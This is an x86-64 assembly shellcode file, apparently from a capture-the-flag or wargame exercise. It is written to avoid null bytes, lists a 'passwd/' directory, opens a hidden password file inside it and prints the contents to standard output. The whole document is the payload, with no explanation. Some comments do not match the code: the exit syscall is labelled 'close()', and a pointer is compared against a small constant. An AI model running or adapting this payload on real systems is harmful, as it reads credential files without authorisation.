BITS 64
global _start

_start:
jmp _push_filename

_readfile:
;open("passwd/", 0, 0)
pop rdi				;rdi = "passwd/\n"
xor byte [rdi + 7], 0x41	;fix \n
xor rdx, rdx
xor rsi, rsi
xor rax, rax
add al, 2
syscall

;getdents(fd, rsp, 0xFF)
mov rdi, rax                    ;fd
xor rdx, rdx
mov dl, 0xff                    ;size = 255
sub rsp, rdx                    ;room size
mov rsi, rsp
xor rax, rax
add al, 78
syscall

_readbuffer:
mov r9, [rsp + 16]		;d_off
and r9, 0x0000FFFF		;_word
lea r10, [rsp + 18]		;filename
xor r11, r11

.LOOP:
inc r11
cmp byte [r10 + r11], 0
jne .LOOP

;write(1, rsp, r11)
mov rdx, r11
xor rdi, rdi
inc rdi                         ;stdout
mov rsi, r10
xor rax, rax
mov r15, rsp			;save value of rsp before new line insertion
inc rax
syscall

cmp r10, 20
ja _OPEN

jmp short _readbuffer

_OPEN:
mov byte [rsp + 17], "/"
mov byte [rsp + 16], "d"
mov byte [rsp + 15], "w"
mov byte [rsp + 14], "s"
mov byte [rsp + 13], "s"
mov byte [rsp + 12], "a"
mov byte [rsp + 11], "p"
mov byte [rsp + 10], "/"
mov byte [rsp + 9], "."

lea r13, [rsp + 9]

;open(".passwd_xXx", 0, 0)
xor rax, rax
mov al, 2
mov rdi, r13
xor rsi, rsi
xor rdx, rdx
syscall

;read(fd, rsp, 0x32)
mov rdi, rax
xor rdx, rdx
mov dl, 0x32
sub rsp, rdx
mov rsi, rsp
xor rax, rax
syscall

xchg rax, rdx

;write(1, rsp, 0xFF)
xor rdi, rdi
inc rdi                         ;stdout
mov rsi, rsp
xor rax, rax
inc rax
syscall

;close()
xor rax, rax
add al, 60
syscall

_push_filename:
call _readfile
path: db "passwd/A"

